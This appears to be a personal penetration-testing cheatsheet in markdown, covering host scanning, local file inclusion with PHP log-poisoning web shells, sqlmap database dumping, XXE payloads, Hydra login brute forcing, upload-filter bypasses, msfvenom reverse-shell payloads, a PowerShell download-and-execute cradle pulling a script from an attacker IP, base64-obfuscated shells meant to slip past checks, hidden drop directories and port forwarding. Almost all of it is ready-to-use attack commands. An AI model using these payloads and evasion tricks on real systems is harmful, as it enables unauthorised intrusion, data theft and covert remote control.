#  wahost070 Pentesting Cheatsheet

- [wahost070 Pentesting Cheatsheet](#wahost070-pentesting-cheatsheet)
  - [Enumeration](#enumeration)
    - [Scanning hosts](#scanning-hosts)
    - [Directory bruteforcing / fuzzing scan](#directory-bruteforcing--fuzzing-scan)
  - [Exploitation](#exploitation)
    - [Local File Inclusion / Remote Code Execution](#local-file-inclusion--remote-code-execution)
    - [Automated SQL Injection](#automated-sql-injection)
    - [Command Injection](#command-injection)
    - [XML External Entity Attack (XXE)](#xml-external-entity-attack-xxe)
    - [Hacking PHP Sessions (Windows) Remote Code Execution](#hacking-php-sessions-windows-remote-code-execution)
    - [Hydra Web-Login Bruteforce](#hydra-web-login-bruteforce)
    - [Spoofing Magic Bytes](#spoofing-magic-bytes)
    - [MSFVenom Basic Payloads](#msfvenom-basic-payloads)
    - [Setting up and accessing SMB share on kali](#setting-up-and-accessing-smb-share-on-kali)
    - [Metasploit auxiliary liistener Payloads](#metasploit-auxiliary-liistener-payloads)
  - [Miscellaneous](#miscellaneous)
    - [Reverse Shells](#reverse-shells)
    - [TTY Shells](#tty-shells)
    - [Obfuscated Python Shells](#obfuscated-python-shells)
      - [PTY Bash](#pty-bash)
    - [Location to Write / Upload exploits:](#location-to-write--upload-exploits)
    - [Importing modules to Metasploit](#importing-modules-to-metasploit)
  - [Portforwarding Techniques](#portforwarding-techniques)
    - [Via Metasploit](#via-metasploit)
    - [Via SSH](#via-ssh)
    - [Via Socat](#via-socat)
    - [Via Netcat](#via-netcat)

## Enumeration

### Scanning hosts
```bash
arp-scan -l #discover target machines via arp
arp-scan --localnet --ignoredups


# BASIC SCAN:
nmap -A -p <PORT> $IP

# DETAILED SCAN:
nmap -v -sS -p- -T4 $IP # Connect scan, quiet

nmap -v -sT -p- -T4 $IP # Connect scan, noisy 

nmap -v -sU $IP # top 1000 on UDP

nmap -v -A -sC -sV -p <OPEN PORTS> $IP # run default scripts on the open ports 
```

### Directory bruteforcing / fuzzing scan
```bash
# wfuzz
# gobuster
# wpscan
# ffuf
# dirb


# ffuf subdomain, gobuster vhost
```

## Exploitation

### Local File Inclusion / Remote Code Execution

```bash
# Check for dot dot slash directory traversal
http://10.10.10.138/writeup/index.php?page=../../../../../../../../etc/passwd
# the above works due to poor sanitisation and typically an include() statement

# Log Poisoning
user-agent: <?php system($_GET["cmd"])?> # setting the user agent to appear in the log file

?file=<?php system($_GET["cmd"])?> #LFI to RCE

?file=/var/log/nginx/error.log&cmd=ls

# Convert to Base64 (decrypt with echo -n <RESULT> | base64 -d)
?file=php://filter/read=convert.base64-encode/resource=/etc/passwd

# Check for following files
C:\\boot.ini # windows
/etc/passwd # linux

```

### Automated SQL Injection
```bash
sqlmap - u <LINK>

sqlmap -r login.req --level 5 --risk 3 --dbs # displays the available database
sqlmap -r login.req -D <DATABASE> --tables
sqlmap -r login.req -D <DATABASE> -T <TABLE> --columns
sqlmap -r login.req -D <DATABASE> -T <TABLE> -C <COLUMN,COLUMN,COLUMN> --dump

# add --threads 4 for multithreading
# add --batch for a completely automated process

```

### Command Injection
Use the following synbols to test for command injection
```
   * ; 
   * | 
   * ||
   * & 
   * &&
   * '
```

### XML External Entity Attack (XXE)

* https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
* https://portswigger.net/web-security/xxe

```xml
<!-- Change from -->
<?xml version="1.0" encoding="UTF-8"?>
<creds>
    <email>admin@h4ck.local</email>
    <pass>admin</pass>
</creds>

<!-- To -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]> <!--<!ENTITY xxe SYSTEM "file:///etc/passwd" >]> -->
<creds>
  <email>`&xxe;`</email>
  <pass>`mypass`</pass>
</creds>

```

### Hacking PHP Sessions (Windows) Remote Code Execution
If you have LFI, then try checking the following location
`C:\Windows\TEMP\sess_<SESSION>` this is the location of the php session (if you access this file, it will list data such as the username)

If you can create a new username as ```<?=`powershell dir`?>```, and then try access the above file with the LFI, if it is executing PHP code then you can get RCE that way


### Hydra Web-Login Bruteforce
```bash
# Get the "error message"
# hydra -VV -F -I -l <USER> -p <Password> <IP Address> http-post-form "<Login Page>:<Request Body>:<Error Message>"
hydra -VV -F -I -L usernames.txt -P passwords.txt $IP http-post-form "/url/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
```

### Spoofing Magic Bytes
Capture an "Upload" of a .gif for instance with burpsuite. Keep the first bunch of bytes and then replace the rest with your shell.

If the website is checking file extensions, try to add the extension somewhere as follows:
* payload.gif.php
* payload.php.gif

### MSFVenom Basic Payloads
```bash
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f elf > ./exploit.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f exe > ./exploit.exe

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f raw > ./exploit.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<PORT> -f raw > ./exploit.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<PORT> -f raw > ./exploit.sh

# Execute a single command (download and load a shell)
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.10.14.30/test.ps1')\""

# View all shellcode formats
msfvenom –help-formats
msfvenom --list payloads

```

### Setting up and accessing SMB share on kali
```bash
# unauthenticated
smbserver.py -smb2support share ./

# authenticated
smbserver.py -smb2support shareName /path/to/location -username guest -password guest 

```

### Metasploit auxiliary liistener Payloads
```bash
msf6> use multi/handler
# SET PAYLOAD AND OTHER SETTINGS
run -j
sessions # view sessions
sessions 1 # go to session
sessions -K # kill all
```

## Miscellaneous

### Reverse Shells

* Resources: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### TTY Shells

Resources:
* https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```bash
# INTERACTIVE SHELL FOR PYTHON:
python -c 'import pty; pty.spawn("/bin/bash")'  #python2
python3 -c 'import pty;pty.spawn("/bin/bash")'  #python3


## Netcat TTY
echo $TERM
stty -a # look for rows and cols
# establish netcat session here
CTRL + Z # background ession
stty raw -echo
fg

# Now we are back in the shell
reset
export SHELL=bash
export TERM=xterm256
stty rows <num> columns <cols>
```


```powershell
Set-ExecutionPolicy Unrestricted

# Check execution policy
Get-ExecutionPolicy
```
Resources: (Red-team PS execution)
* https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

### Obfuscated Python Shells
#### PTY Bash

```python
# spawn pty shell (obfuscated)
python3 -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHB0eTsgcHR5LnNwYXduKCcvdXNyL2Jpbi9iYXNoJyk=')[0]))"
```

```python
# spawn pty shell (not the usual command, may bypass basic checks)
python3 -c "__import__('pty').spawn('/bin/bash')"
```

```python
sh -c "$(echo cHl0aG9uIC1jICdpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw== | base64 -d)"
```
### Location to Write / Upload exploits:
```bash
/tmp/.hidden
/dev/shm/.hidden
```
powershell
```
C:\\Temp\\.hidden
C:\\windows\\system32\\spool\\drivers\\color\\.hidden
```

### Importing modules to Metasploit
```bash
cd /root/.msf4/modules/exploits/custom
cp <MODULE> ./

# Update Metasploit
updatedb && msfdb init
```

## Portforwarding Techniques
### Via Metasploit
```bash
# Gain a meterpreter session
msf5> portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <REMOTE_ADDRESS>
```
### Via SSH
```bash
# Connecting from our machine to the remote machine with SSH creds
ssh -L <LOCAL_PORT>:localhost:<REMOTE_TARGET_PORT> -nNT sshCreds@<REMOTE> # Run this on your machine 

# Forwards port from remote machine to local machine 
ssh -R <REMOTE_PORT>:localhost:<LOCAL_TARGET_PORT> -nNT yourSSHCreds@<LOCAL> # Run this on the remote machine (addresses can be substituted with other interface addresses)
```
### Via Socat
```bash
# Run on local machine (listener, redirects all traffic from 10000 to specified port)
socat -v TCP4-LISTEN:10000 TCP4-LISTEN:<PORT>

# Run on remote host
socat TCP4:<YOUR_ADDRESS>:<YOUR_LISTENER_PORT> TCP4:localhost:<TARGET_PORT>
```
### Via Netcat

References:
* https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/


